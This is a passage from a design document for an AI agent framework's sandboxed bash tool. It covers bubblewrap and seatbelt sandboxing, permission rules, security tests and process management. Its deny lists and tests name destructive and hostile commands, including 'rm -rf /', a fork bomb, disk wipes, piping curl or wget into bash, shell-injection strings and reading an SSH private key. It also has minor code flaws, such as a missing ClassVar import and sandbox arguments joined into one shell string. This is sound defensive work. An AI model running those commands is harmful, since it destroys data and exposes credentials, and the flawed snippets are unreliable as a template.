        - `cd` or `cd ~` → home directory
        - `cd -` → previous directory
        - `cd /absolute/path` → absolute path
        - `cd relative/path` → relative to current

        Args:
            new_dir: New directory path (absolute, relative, or special).
        """
        import os

        current = self.get_working_directory()

        # Handle special cases
        if not new_dir or new_dir == "~":
            # cd with no args or ~ goes to home
            new_path = Path.home()
        elif new_dir.startswith("~/"):
            # Expand ~ at start
            new_path = Path.home() / new_dir[2:]
        elif new_dir == "-":
            # cd - goes to previous directory
            if self._previous_directory:
                new_path = self._previous_directory
            else:
                return  # No previous directory, ignore
        elif Path(new_dir).is_absolute():
            new_path = Path(new_dir).resolve()
        else:
            new_path = (current / new_dir).resolve()

        # Track previous directory for cd -
        self._previous_directory = current

        # Validate new directory is within workspace (warning only)
        if self._resolved_workspace:
            try:
                new_path.relative_to(self._resolved_workspace)
            except ValueError:
                # Allow cd outside workspace but track it
                # Security is enforced by sandbox, not path tracking
                pass

        self._current_directory = new_path

    def _build_command_with_env(self, command: str) -> str:
        """Wrap command with env_file sourcing if configured.

        This enables persistent environment variables by sourcing a file
        before each command execution.

        Args:
            command: The shell command to execute.

        Returns:
            Command string, optionally prefixed with source statement.
        """
        if self.env_file:
            env_path = Path(self.env_file).expanduser().resolve()
            if env_path.exists():
                # Source the env file before running the command
                # Use '.' for POSIX compatibility (source is bash-specific)
                return f'. "{env_path}" && {command}'
        return command

    def build_sandbox_command(self, command: str) -> list[str]:
        """Wrap command in sandbox if enabled, with env_file sourcing.

        Args:
            command: The shell command to wrap.

        Returns:
            Command list ready for subprocess execution.

        Raises:
            SandboxNotAvailableError: If sandbox enabled but tools not available.
        """
        import platform

        # Apply env_file sourcing
        command = self._build_command_with_env(command)

        if not self.enable_sandbox:
            return [self.get_shell(), "-c", command]

        # Check sandbox availability (may have been disabled on Windows)
        if self._sandbox_available is False:
            return [self.get_shell(), "-c", command]

        system = platform.system()

        if system == "Linux":
            return self._build_bubblewrap_command(command)
        elif system == "Darwin":
            return self._build_seatbelt_command(command)
        else:
            # No sandboxing on Windows, run directly
            return [self.get_shell(), "-c", command]

    def _build_bubblewrap_command(self, command: str) -> list[str]:
        """Build bubblewrap command for Linux sandboxing."""
        bwrap_cmd = [
            "bwrap",
            # Read-only bind mounts for system directories
            "--ro-bind", "/usr", "/usr",
            "--ro-bind", "/lib", "/lib",
            "--ro-bind", "/lib64", "/lib64",
            "--ro-bind", "/bin", "/bin",
            "--ro-bind", "/sbin", "/sbin",
            "--ro-bind", "/etc", "/etc",
            # Proc and dev
            "--proc", "/proc",
            "--dev", "/dev",
            # Temporary directories
            "--tmpfs", "/tmp",
            "--tmpfs", "/run",
        ]

        # Add workspace as read-write
        if self._resolved_workspace:
            bwrap_cmd.extend([
                "--bind", str(self._resolved_workspace), str(self._resolved_workspace),
            ])

        # Add additional write paths
        for path in self.sandbox_allow_write_paths:
            expanded = Path(path).expanduser().resolve()
            if expanded.exists():
                bwrap_cmd.extend(["--bind", str(expanded), str(expanded)])

        # Network isolation
        if not self.sandbox_allow_network:
            bwrap_cmd.append("--unshare-net")

        # Die with parent
        bwrap_cmd.append("--die-with-parent")

        # Add the actual command
        bwrap_cmd.extend([self.get_shell(), "-c", command])

        return bwrap_cmd

    def _build_seatbelt_command(self, command: str) -> list[str]:
        """Build sandbox-exec command for macOS sandboxing."""
        # Build seatbelt profile dynamically
        profile_lines = [
            "(version 1)",
            "(deny default)",
            # Allow basic operations
            "(allow process-exec)",
            "(allow process-fork)",
            "(allow signal)",
            # Allow reading most paths
            "(allow file-read*)",
        ]

        # Deny reading sensitive paths
        for path in self.sandbox_deny_read_paths:
            expanded = Path(path).expanduser()
            profile_lines.append(f'(deny file-read* (subpath "{expanded}"))')

        # Allow writing to workspace
        if self._resolved_workspace:
            profile_lines.append(f'(allow file-write* (subpath "{self._resolved_workspace}"))')

        # Allow writing to additional paths
        for path in self.sandbox_allow_write_paths:
            expanded = Path(path).expanduser().resolve()
            profile_lines.append(f'(allow file-write* (subpath "{expanded}"))')

        # Allow writing to temp
        profile_lines.append('(allow file-write* (subpath "/tmp"))')
        profile_lines.append('(allow file-write* (subpath "/private/tmp"))')

        # Network
        if self.sandbox_allow_network:
            profile_lines.append("(allow network*)")
        else:
            profile_lines.append("(deny network*)")

        profile = "\n".join(profile_lines)

        return [
            "sandbox-exec",
            "-p", profile,
            self.get_shell(), "-c", command,
        ]


# Context variable for async-safe global context
import contextvars

_shell_security_context_var: contextvars.ContextVar[Optional[ShellSecurityContext]] = (
    contextvars.ContextVar("shell_security_context", default=None)
)


def set_shell_security_context(ctx: ShellSecurityContext) -> None:
    """Set the shell security context for the current async context."""
    _shell_security_context_var.set(ctx)


def get_shell_security_context() -> ShellSecurityContext:
    """Get the current shell security context.

    Returns:
        Current context, or a permissive default if none set.
    """
    ctx = _shell_security_context_var.get()
    if ctx is None:
        import warnings
        warnings.warn(
            "No ShellSecurityContext configured. Creating permissive default. "
            "This is deprecated - call set_shell_security_context() first.",
            DeprecationWarning,
            stacklevel=2,
        )
        ctx = ShellSecurityContext()
        _shell_security_context_var.set(ctx)
    return ctx
```

### 6.4 Layer 2: Permission System Integration

The shell tools integrate with the existing permission system from the filesystem tools.

**Example Permission Configuration:**

```json
{
  "permissions": {
    "allow": [
      "Bash(git status)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(npm test)",
      "Bash(npm run lint)",
      "Bash(pytest*)",
      "Bash(python -m pytest*)"
    ],
    "deny": [
      "Bash(rm -rf *)",
      "Bash(git push --force*)",
      "Bash(git reset --hard*)",
      "Bash(sudo *)",
      "Bash(curl * | bash)",
      "Bash(wget * | bash)"
    ],
    "ask": [
      "Bash(git push*)",
      "Bash(git commit*)",
      "Bash(npm install*)",
      "Bash(pip install*)"
    ]
  }
}
```

### 6.5 Layer 3: OS-Level Sandbox Integration

RawAgents provides optional integration with OS-level sandboxing. This is the **strongest** security layer.

#### Linux: bubblewrap

```bash
# Example bubblewrap invocation (what RawAgents generates)
bwrap \
    --ro-bind /usr /usr \
    --ro-bind /lib /lib \
    --ro-bind /lib64 /lib64 \
    --ro-bind /bin /bin \
    --ro-bind /sbin /sbin \
    --ro-bind /etc /etc \
    --proc /proc \
    --dev /dev \
    --tmpfs /tmp \
    --bind /home/user/project /home/user/project \
    --unshare-net \
    --die-with-parent \
    /bin/bash -c "git status"
```

**Requirements:**
- `bubblewrap` package installed (`apt install bubblewrap`)
- User namespaces enabled (default on most modern Linux)

#### macOS: sandbox-exec (seatbelt)

```bash
# Example seatbelt invocation (what RawAgents generates)
sandbox-exec -p '
(version 1)
(deny default)
(allow process-exec)
(allow process-fork)
(allow file-read*)
(deny file-read* (subpath "/Users/user/.ssh"))
(allow file-write* (subpath "/Users/user/project"))
(allow file-write* (subpath "/tmp"))
(deny network*)
' /bin/bash -c "git status"
```

**Requirements:**
- Built into macOS (no installation needed)
- Some operations may require disabling SIP (System Integrity Protection)

### 6.6 Docker and Container Environments

**IMPORTANT:** Running command execution tools inside Docker containers requires special consideration.

#### Known Limitation: Process Group Killing

When running inside a Docker container, the standard process group killing pattern can cause issues:

```python
# This can kill the parent process in Docker!
os.killpg(os.getpgid(process.pid), signal.SIGTERM)
```

**Problem:** In Docker containers, the main process and spawned processes may share the same process group. When sending a signal to the process group, you might inadvertently kill the main application.

**Symptoms:**
- Container exits with code 137 (SIGKILL)
- Background process termination crashes the application
- Timeout handling causes application termination

**Workarounds:**

1. **Use `setsid` for background processes:**
   ```bash
   # Manual isolation with setsid
   setsid npm run dev > /tmp/server.log 2>&1 &
   ```
   Note: This loses RawAgents' background process monitoring.

2. **Use `start_new_session=True` (already implemented):**
   ```python
   process = await asyncio.create_subprocess_shell(
       command,
       start_new_session=True,  # Creates new process group
   )
   ```

3. **Detect Docker environment and adjust behavior:**
   ```python
   def is_docker() -> bool:
       """Check if running inside Docker."""
       return (
           Path("/.dockerenv").exists() or
           os.environ.get("container") == "docker"
       )

   if is_docker():
       # Use SIGTERM to individual process, not process group
       process.terminate()
   else:
       os.killpg(pgid, signal.SIGTERM)
   ```

#### Container Sandbox Interaction

When running inside a container that already provides isolation:

| Host Environment | Recommendation |
|-----------------|----------------|
| Docker (standard) | Sandbox optional; container provides isolation |
| Docker (privileged) | Enable sandbox; privileged mode reduces isolation |
| Kubernetes (unprivileged pod) | Sandbox may fail; use container-level restrictions |
| Kubernetes (with seccomp/AppArmor) | Sandbox optional; pod security provides isolation |

**Configuration for Container Environments:**

```python
# Detect and configure for container environment
import os

def create_container_aware_context(workspace: str) -> ShellSecurityContext:
    """Create a security context appropriate for container environments."""
    is_container = (
        Path("/.dockerenv").exists() or
        os.environ.get("container") is not None or
        os.environ.get("KUBERNETES_SERVICE_HOST") is not None
    )

    return ShellSecurityContext(
        workspace=workspace,
        # Skip OS-level sandbox in containers (container IS the sandbox)
        enable_sandbox=not is_container,
        # Always enforce command validation regardless of environment
        deny_patterns=list(_DEFAULT_DENY_PATTERNS),
    )
```

### 6.7 Security Testing Requirements

**File:** `tests/tools/builtin/shell/test_security.py`

```python
"""Security tests for shell/command execution tools.

These tests verify that the security module properly prevents:
1. Dangerous command execution
2. Command injection attacks
3. Working directory escape
4. Sandbox bypass attempts
"""

import pytest
import asyncio
from rawagents.tools.builtin.shell._security import (
    ShellSecurityContext,
    CommandSecurityError,
    set_shell_security_context,
)
from rawagents.tools.builtin.shell import bash


class TestDangerousCommands:
    """Test protection against dangerous commands."""

    @pytest.mark.parametrize("command", [
        "rm -rf /",
        "rm -rf /*",
        "rm -rf ~",
        "rm -rf .",
        "dd if=/dev/zero of=/dev/sda",
        ":(){ :|:& };:",  # Fork bomb
        "git push --force origin main",
        "git reset --hard HEAD~10",
    ])
    async def test_blocks_dangerous_commands(self, secure_context, command):
        ctx = ShellSecurityContext(workspace="/tmp/test")
        set_shell_security_context(ctx)

        with pytest.raises(CommandSecurityError) as exc:
            ctx.validate_command(command)

        assert "blocked" in str(exc.value).lower()

    async def test_allows_safe_commands(self, secure_context):
        ctx = ShellSecurityContext(workspace="/tmp/test")
        set_shell_security_context(ctx)

        # These should NOT raise
        ctx.validate_command("git status")
        ctx.validate_command("ls -la")
        ctx.validate_command("echo 'hello world'")
        ctx.validate_command("npm test")


class TestCommandInjection:
    """Test protection against command injection."""

    @pytest.mark.parametrize("command", [
        "echo hello; rm -rf /",
        "echo hello && rm -rf /",
        "echo hello || rm -rf /",
        "$(rm -rf /)",
        "`rm -rf /`",
        "echo hello > /etc/passwd",
    ])
    async def test_injection_patterns(self, secure_context, command):
        """Commands containing injection patterns should be scrutinized."""
        ctx = ShellSecurityContext(
            workspace="/tmp/test",
            deny_patterns=["*rm -rf /*", "*> /etc/*"],
        )
        set_shell_security_context(ctx)

        with pytest.raises(CommandSecurityError):
            ctx.validate_command(command)


class TestAllowlistMode:
    """Test allowlist-only execution mode."""

    async def test_allowlist_rejects_unlisted(self):
        ctx = ShellSecurityContext(
            workspace="/tmp/test",
            allow_patterns=["git *", "npm test"],
        )
        set_shell_security_context(ctx)

        # Allowed
        ctx.validate_command("git status")
        ctx.validate_command("npm test")

        # Not allowed
        with pytest.raises(CommandSecurityError) as exc:
            ctx.validate_command("curl https://example.com")

        assert "not in allowlist" in str(exc.value)


class TestSandboxIntegration:
    """Test sandbox command generation."""

    def test_bubblewrap_command_generation(self):
        ctx = ShellSecurityContext(
            workspace="/home/user/project",
            enable_sandbox=True,
            sandbox_allow_network=False,
        )

        cmd = ctx.build_sandbox_command("git status")

        assert "bwrap" in cmd[0] or "sandbox-exec" in cmd[0]

    def test_sandbox_denies_sensitive_paths(self):
        ctx = ShellSecurityContext(
            workspace="/home/user/project",
            enable_sandbox=True,
            sandbox_deny_read_paths=["~/.ssh", "~/.aws"],
        )

        cmd = ctx.build_sandbox_command("cat ~/.ssh/id_rsa")

        # Command should be wrapped in sandbox that denies this
        assert len(cmd) > 3  # Has sandbox wrapper


@pytest.fixture
def secure_context(tmp_path):
    """Create a temporary secure context."""
    ctx = ShellSecurityContext(workspace=str(tmp_path))
    set_shell_security_context(ctx)
    yield ctx
```

### 6.8 Security References

| Resource | URL | Description |
|----------|-----|-------------|
| **Claude Code Sandboxing** | [anthropic.com/engineering/claude-code-sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) | Official sandboxing architecture |
| **Anthropic Sandbox Runtime** | [github.com/anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime) | Open-source sandboxing tool |
| **OWASP Command Injection** | [owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection) | Command injection attack patterns |
| **OWASP OS Command Defense** | [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) | Prevention best practices |
| **bubblewrap** | [github.com/containers/bubblewrap](https://github.com/containers/bubblewrap) | Linux sandboxing tool |
| **macOS Seatbelt** | [reverse.put.as/seatbelt](https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf) | macOS sandbox documentation |
| **Python shlex** | [docs.python.org/3/library/shlex.html](https://docs.python.org/3/library/shlex.html) | Shell escaping |
| **asyncio subprocess** | [docs.python.org/3/library/asyncio-subprocess.html](https://docs.python.org/3/library/asyncio-subprocess.html) | Async subprocess handling |
| **Claude Code Env Vars** | [github.com/anthropics/claude-code/issues/2508](https://github.com/anthropics/claude-code/issues/2508) | Environment persistence discussion |

---

## 7. Implementation Approach

### 7.1 Core Module Structure

```python
# rawagents/tools/builtin/shell/__init__.py

from rawagents.tools.builtin.shell.bash import bash
from rawagents.tools.builtin.shell.bash_output import bash_output
from rawagents.tools.builtin.shell.kill_shell import kill_shell
from rawagents.tools.builtin.shell._security import (
    ShellSecurityContext,
    set_shell_security_context,
    get_shell_security_context,
    CommandSecurityError,
)

__all__ = [
    "bash",
    "bash_output",
    "kill_shell",
    "ShellSecurityContext",
    "set_shell_security_context",
    "get_shell_security_context",
    "CommandSecurityError",
]
```

### 7.2 Streaming Output Architecture

Real-time output streaming is critical for long-running commands and background processes. This section documents the streaming architecture.

#### Why Streaming Matters

1. **Prevents Deadlocks:** Subprocess stdout/stderr buffers are limited (~64KB). If the buffer fills and your code isn't reading, the subprocess blocks.

2. **User Experience:** Users see progress in real-time instead of waiting for command completion.

3. **Memory Efficiency:** Don't accumulate large outputs in memory; process line-by-line.

#### Streaming Pattern

```python
"""Real-time output streaming for shell commands.

Based on asyncio best practices:
- Reference: https://docs.python.org/3/library/asyncio-subprocess.html
- Avoids deadlocks by consuming output continuously
- Supports callbacks for real-time processing
"""

from __future__ import annotations

import asyncio
from typing import Callable, Optional
from collections.abc import AsyncIterator


async def stream_output(
    process: asyncio.subprocess.Process,
    on_line: Optional[Callable[[str], None]] = None,
) -> AsyncIterator[str]:
    """Stream output from a subprocess line by line.

    Args:
        process: The asyncio subprocess.
        on_line: Optional callback invoked for each line (for real-time UI updates).

    Yields:
        Each line of output as it becomes available.

    Example:
        >>> process = await asyncio.create_subprocess_shell(
        ...     "npm run build",
        ...     stdout=asyncio.subprocess.PIPE,
        ...     stderr=asyncio.subprocess.STDOUT,
        ... )
        >>> async for line in stream_output(process, on_line=print):
        ...     pass  # Lines already printed by callback
    """
    if process.stdout is None:
        return

    while True:
        line = await process.stdout.readline()
        if not line:
            break

        decoded = line.decode("utf-8", errors="replace").rstrip("\n\r")

        if on_line:
            on_line(decoded)

        yield decoded


async def stream_with_timeout(
    process: asyncio.subprocess.Process,
    timeout_seconds: float,
    on_line: Optional[Callable[[str], None]] = None,
) -> tuple[list[str], bool]:
    """Stream output with a timeout.

    Args:
        process: The asyncio subprocess.
        timeout_seconds: Maximum time to wait.
        on_line: Optional callback for each line.

    Returns:
        Tuple of (collected_lines, timed_out).

    Example:
        >>> lines, timed_out = await stream_with_timeout(process, 30.0)
        >>> if timed_out:
        ...     print("Command timed out!")
    """
    lines: list[str] = []
    timed_out = False

    async def collect():
        async for line in stream_output(process, on_line):
            lines.append(line)

    try:
        await asyncio.wait_for(
            asyncio.gather(collect(), process.wait()),
            timeout=timeout_seconds,
        )
    except asyncio.TimeoutError:
        timed_out = True

    return lines, timed_out
```

#### Integration with ProcessManager

The `ProcessManager` (below) uses streaming to collect background process output:

```python
# In ProcessManager._collect_output():
async for line in stream_output(info.process):
    async with self._lock:
        info.output_buffer.append(line)
```

#### Streaming vs communicate()

| Method | Use Case | Pros | Cons |
|--------|----------|------|------|
| `process.communicate()` | Short commands, small output | Simple, handles both streams | Blocks until complete, memory accumulation |
| `stream_output()` | Long commands, real-time UI | Progressive output, memory efficient | More complex, must handle both streams separately |

**Recommendation:** Use streaming for background processes and commands with `run_in_background=True`. Use `communicate()` for foreground commands with expected small output.

### 7.3 Process Manager

A central process manager tracks background processes:

**File:** `rawagents/tools/builtin/shell/_process_manager.py`

```python
"""Process manager for tracking background shell processes.

This module provides a registry for background processes, enabling:
- Output retrieval for running processes
- Process termination
- Cleanup of completed processes
"""

from __future__ import annotations

import asyncio
import os
import signal
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional
import contextvars


@dataclass
class ProcessInfo:
    """Information about a tracked process."""

    pid: int
    process: asyncio.subprocess.Process
    command: str
    started_at: datetime = field(default_factory=datetime.now)
    output_buffer: list[str] = field(default_factory=list)
    MAX_BUFFER_LINES: ClassVar[int] = 10_000  # Prevent unbounded memory growth
    last_read_index: int = 0
    _new_output_event: asyncio.Event = field(default_factory=asyncio.Event, init=False, repr=False)

    @property
    def is_running(self) -> bool:
        """Check if process is still running."""
        return self.process.returncode is None

    @property
    def exit_code(self) -> Optional[int]:
        """Get exit code if process has completed."""
        return self.process.returncode


class ProcessManager:
    """Manages background shell processes.

    This class maintains a registry of all background processes started
    by the bash tool, enabling output retrieval and termination.

    Thread-safety: Uses asyncio locks for concurrent access.
    """

    def __init__(self):
        self._processes: dict[str, ProcessInfo] = {}
        self._lock = asyncio.Lock()

    async def register(
        self,
        process: asyncio.subprocess.Process,
        command: str,
    ) -> str:
        """Register a new background process.

        Args:
            process: The asyncio subprocess.
            command: The command that was executed.

        Returns:
            Process ID as string.
        """
        pid = str(process.pid)
        async with self._lock:
            self._processes[pid] = ProcessInfo(
                pid=process.pid,
                process=process,
                command=command,
            )

        # Start background task to collect output
        asyncio.create_task(self._collect_output(pid))

        return pid

    async def _collect_output(self, pid: str) -> None:
        """Collect output from a background process.

        Signals ``_new_output_event`` on each new line so that
        ``get_output()`` can wake up immediately instead of polling.
        """
        async with self._lock:
            info = self._processes.get(pid)
            if not info:
                return

        try:
            # Read output line by line
            while True:
                if info.process.stdout:
                    line = await info.process.stdout.readline()
                    if not line:
                        break
                    async with self._lock:
                        info.output_buffer.append(line.decode("utf-8", errors="replace"))
                        # Evict oldest lines when buffer exceeds limit
                        if len(info.output_buffer) > info.MAX_BUFFER_LINES:
                            overflow = len(info.output_buffer) - info.MAX_BUFFER_LINES
                            del info.output_buffer[:overflow]
                            info.last_read_index = max(0, info.last_read_index - overflow)
                    # Signal that new output is available
                    info._new_output_event.set()
                else:
                    break
        except Exception:
            pass

        # Wait for process to complete
        await info.process.wait()
        # Final signal so any waiting get_output() call returns immediately
        info._new_output_event.set()

    async def get_output(self, pid: str, timeout: int = 5000) -> tuple[str, str]:
        """Get new output from a process.

        Uses event-based waiting: returns as soon as new output is available
        rather than sleeping for the full timeout duration. This is both more
        responsive and more efficient than fixed-interval polling.

        Args:
            pid: Process ID.
            timeout: Maximum time to wait for new output, in milliseconds.

        Returns:
            Tuple of (new_output, status_message).
        """
        async with self._lock:
            info = self._processes.get(pid)
            if not info:
                return "", "Error: Process not found"

        # Wait for new output OR timeout — whichever comes first.
        # The event is set by _collect_output() whenever a new line arrives
        # or when the process completes.
        try:
            info._new_output_event.clear()
            await asyncio.wait_for(info._new_output_event.wait(), timeout=timeout / 1000)
        except asyncio.TimeoutError:
            pass  # Timeout is fine — return whatever we have

        async with self._lock:
            # Get new output since last read
            new_lines = info.output_buffer[info.last_read_index:]
            info.last_read_index = len(info.output_buffer)

            output = "".join(new_lines)

            # Build status message
            if info.is_running:
                status = "Process status: running"
            else:
                status = f"Process status: completed (exit code {info.exit_code})"

        return output, status

    async def kill(self, pid: str, force: bool = False) -> str:
        """Kill a process.

        Args:
            pid: Process ID.
            force: Use SIGKILL instead of SIGTERM.

        Returns:
            Result message.
        """
        async with self._lock:
            info = self._processes.get(pid)
            if not info:
                return f"Error: Process {pid} not found"

        if not info.is_running:
            async with self._lock:
                del self._processes[pid]
            return f"Process {pid} already terminated"

        try:
            # Kill process group to include children
            pgid = os.getpgid(info.process.pid)

            if force:
                os.killpg(pgid, signal.SIGKILL)
            else:
                os.killpg(pgid, signal.SIGTERM)

                # Wait for graceful shutdown
                try:
                    await asyncio.wait_for(info.process.wait(), timeout=5)
                except asyncio.TimeoutError:
                    # Force kill if still running
                    os.killpg(pgid, signal.SIGKILL)

            await info.process.wait()

        except ProcessLookupError:
            pass  # Already dead
        except OSError as e:
            return f"Error: Failed to kill process {pid}: {e}"

        async with self._lock:
            if pid in self._processes:
                del self._processes[pid]

        return f"Process {pid} terminated successfully"

    async def cleanup(self) -> None:
        """Clean up all tracked processes."""
        async with self._lock:
            pids = list(self._processes.keys())

        for pid in pids:
            await self.kill(pid, force=True)


# Global process manager instance.
#
# DESIGN DECISION: ProcessManager is intentionally a module-level singleton
# rather than using contextvars.ContextVar (like ShellSecurityContext does).
#
# Rationale: OS processes are inherently global — there is one process table
# shared across all async contexts. A background process started in one
# coroutine must be killable from another. Using contextvars would create
# per-context isolation that would *prevent* cross-coroutine process management,
# which is the opposite of what we want.
#
# ShellSecurityContext uses contextvars because security policies CAN differ
# per-agent/per-task. ProcessManager tracks shared OS resources that MUST
# be globally visible.
_process_manager: Optional[ProcessManager] = None


def get_process_manager() -> ProcessManager:
    """Get the global process manager (singleton).

    Returns the same instance across all async contexts, enabling
    cross-coroutine process management (e.g., one coroutine starts a
    background process, another reads its output or kills it).
    """
    global _process_manager
    if _process_manager is None:
        _process_manager = ProcessManager()
    return _process_manager
```

### 7.3 Tool Implementation Pattern

**File:** `rawagents/tools/builtin/shell/bash.py`

```python
"""Bash tool for executing shell commands.

Implements shell command execution with:
- Async subprocess execution
- Timeout handling with graceful termination
- Background process support
- Security validation via ShellSecurityContext
"""

from __future__ import annotations

import asyncio
import os
import signal
from typing import Annotated, Optional

from rawagents.tools import tool
from rawagents.tools.builtin.shell._security import (
    get_shell_security_context,
    CommandSecurityError,
)
from rawagents.tools.builtin.shell._process_manager import get_process_manager


__all__ = ["bash"]

MAX_OUTPUT_BYTES = 50 * 1024  # 50KB output limit
MAX_OUTPUT_LINES = 2000       # Max lines before truncation (matches OpenCode/Claude Code)


def _extract_cd_target(command: str) -> Optional[str]:
    """Extract the target directory from a cd command.

    Handles various cd patterns:
    - cd (no args, goes to home)
    - cd /absolute/path
    - cd relative/path
    - cd ~, cd ~/subdir
    - cd -, cd $OLDPWD
    - cd "path with spaces"
    - cd 'path with spaces'
    - Chained: cd /path && other_command
    - Chained: cd /path; other_command

    Args:
        command: The shell command string.

    Returns:
        The cd target directory, or None if not a cd command.
    """
    import shlex

    # Normalize whitespace
    stripped = command.strip()

    # Check if this is a cd command
    if stripped == "cd":
        return "~"

    if not (stripped.startswith("cd ") or stripped.startswith("cd\t")):
        return None

    # Extract the part after "cd "
    rest = stripped[3:].strip()
    if not rest:
        return "~"

    # Handle chained commands - only process up to first command separator
    # We need to be careful with separators inside quotes
    separators = ["&&", "||", ";", "|"]

    # Simple heuristic: find first unquoted separator
    in_single_quote = False
    in_double_quote = False
    target_end = len(rest)

    for i, char in enumerate(rest):
        if char == "'" and not in_double_quote:
            in_single_quote = not in_single_quote
        elif char == '"' and not in_single_quote:
            in_double_quote = not in_double_quote
        elif not in_single_quote and not in_double_quote:
            # Check for separators
            for sep in separators:
                if rest[i:].startswith(sep):
                    target_end = i
                    break
            if target_end != len(rest):
                break

    target = rest[:target_end].strip()

    # Remove surrounding quotes if present
    if (target.startswith('"') and target.endswith('"')) or \
       (target.startswith("'") and target.endswith("'")):
        target = target[1:-1]

    return target if target else "~"


def _update_working_directory_from_command(
    ctx: "ShellSecurityContext",
    command: str,
    exit_code: int,
) -> None:
    """Update working directory tracking based on command execution.

    Only updates if the command succeeded (exit_code == 0) to avoid
    tracking failed cd attempts.

    Args:
        ctx: The security context to update.
        command: The executed command.
        exit_code: The command's exit code.
    """
    # Only update on successful commands
    if exit_code != 0:
        return

    cd_target = _extract_cd_target(command)
    if cd_target is not None:
        ctx.update_working_directory(cd_target)


@tool
async def bash(
    command: Annotated[str, "The shell command to execute"],
    description: Annotated[Optional[str], "Description of what this command does"] = None,
    timeout: Annotated[Optional[int], "Timeout in milliseconds (max 600000)"] = None,
    run_in_background: Annotated[bool, "Run command in background, return PID"] = False,
    dangerously_disable_sandbox: Annotated[bool, "Override sandbox mode (use with extreme caution)"] = False,
) -> str:
    """Execute a shell command.

    Executes the given command in a shell (bash by default). The working
    directory persists between commands in the same session.

    Security:
        - Commands are validated against deny patterns
        - Working directory is tracked and can be restricted
        - Optional sandbox integration for OS-level isolation

    Background Mode:
        - Set run_in_background=True for long-running commands
        - Returns process ID immediately
        - Use bash_output() to retrieve output
        - Use kill_shell() to terminate

    Timeout:
        - Default: 120 seconds
        - Maximum: 600 seconds (10 minutes)
        - On timeout: SIGTERM, then SIGKILL after 5 seconds

    Example:
        >>> await bash("git status")
        'On branch main\\nnothing to commit...'

        >>> await bash("npm run dev", run_in_background=True)
        'Started background process with PID: 12345'
    """
    ctx = get_shell_security_context()

    # Validate command
    try:
        ctx.validate_command(command)
    except CommandSecurityError as e:
        return f"Error: {e}"

    # Validate and normalize timeout
    timeout_ms = ctx.validate_timeout(timeout)
    timeout_sec = timeout_ms / 1000

    # Get execution environment
    cwd = ctx.get_working_directory()
    env = os.environ.copy()

    # Build command (with optional sandbox wrapper)
    # dangerously_disable_sandbox overrides the context setting
    use_sandbox = ctx.enable_sandbox and not dangerously_disable_sandbox
    cmd_args = ctx.build_sandbox_command(command) if use_sandbox else [ctx.get_shell(), "-c", command]

    try:
        # Create subprocess
        process = await asyncio.create_subprocess_shell(
            command if not use_sandbox else " ".join(cmd_args),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,  # Combine stdout/stderr
            cwd=str(cwd),
            env=env,
            start_new_session=True,  # Enable process group killing
        )

        if run_in_background:
            # Register and return immediately
            manager = get_process_manager()
            pid = await manager.register(process, command)
            return f"Started background process with PID: {pid}"

        # Wait for completion with timeout
        try:
            stdout, _ = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout_sec,
            )
        except asyncio.TimeoutError:
            # Graceful termination
            try:
                pgid = os.getpgid(process.pid)
                os.killpg(pgid, signal.SIGTERM)

                # Wait briefly for graceful shutdown
                try:
                    await asyncio.wait_for(process.wait(), timeout=5)
                except asyncio.TimeoutError:
                    # Force kill
                    os.killpg(pgid, signal.SIGKILL)
                    await process.wait()
            except (ProcessLookupError, OSError):
                pass

            return f"Error: Command timed out after {timeout_sec} seconds"

        # Decode output
        output = stdout.decode("utf-8", errors="replace")

        # Truncate if too large (dual truncation: lines AND bytes)
        # Whichever limit is hit first triggers truncation.
        # Full output is persisted to a temp file so it can be retrieved.
        truncated = False
        lines = output.split("\n")
        if len(lines) > MAX_OUTPUT_LINES:
            output = "\n".join(lines[:MAX_OUTPUT_LINES])
            truncated = True
        if len(output.encode("utf-8")) > MAX_OUTPUT_BYTES:
            output = output[:MAX_OUTPUT_BYTES].rsplit("\n", 1)[0]
            truncated = True

        if truncated:
            # Persist full output to temp file for retrieval
            import tempfile
            full_output = stdout.decode("utf-8", errors="replace")
            with tempfile.NamedTemporaryFile(
                mode="w",
                prefix="rawagents_bash_",
                suffix=".txt",
                delete=False,
            ) as f:
                f.write(full_output)
                output_file = f.name

            output += (
                f"\n\n... (output truncated at {MAX_OUTPUT_LINES} lines / "
                f"{MAX_OUTPUT_BYTES // 1024}KB)\n"
                f"Full output saved to: {output_file}"
            )

        # Track working directory changes
        _update_working_directory_from_command(ctx, command, process.returncode)

        # Optionally reset to project directory after each command
        if ctx.maintain_project_working_dir and ctx._resolved_workspace:
            ctx._current_directory = ctx._resolved_workspace

        # Format result
        if process.returncode == 0:
            return output.strip() if output.strip() else "(no output)"
        else:
            return f"Error: Command failed with exit code {process.returncode}\n{output.strip()}"

    except Exception as e:
        return f"Error: Failed to execute command: {e}"
```

---

## 8. Reference Implementations

### 8.1 Bash Tool References

| Source | Location | Notes |
|--------|----------|-------|
| **OpenCode** | [github.com/sst/opencode/.../bash.ts](https://github.com/sst/opencode/blob/dev/packages/opencode/src/tool/bash.ts) | TypeScript, shell=true |
| **Claude Code** | Built-in (schema-less) | Persistent session, sandboxed |
| **Anthropic Sandbox** | [github.com/anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime) | Open-source sandboxing |
| **Python subprocess** | [docs.python.org/3/library/subprocess.html](https://docs.python.org/3/library/subprocess.html) | Standard library |
| **asyncio subprocess** | [docs.python.org/3/library/asyncio-subprocess.html](https://docs.python.org/3/library/asyncio-subprocess.html) | Async subprocess |

### 8.2 Process Management References

| Source | Location | Notes |
|--------|----------|-------|
| **Python os.killpg** | [docs.python.org/3/library/os.html#os.killpg](https://docs.python.org/3/library/os.html#os.killpg) | Process group killing |
| **shlex.quote** | [docs.python.org/3/library/shlex.html#shlex.quote](https://docs.python.org/3/library/shlex.html#shlex.quote) | Shell escaping |
| **signal module** | [docs.python.org/3/library/signal.html](https://docs.python.org/3/library/signal.html) | Signal handling |

### 8.3 Sandboxing References

| Source | Location | Notes |
|--------|----------|-------|
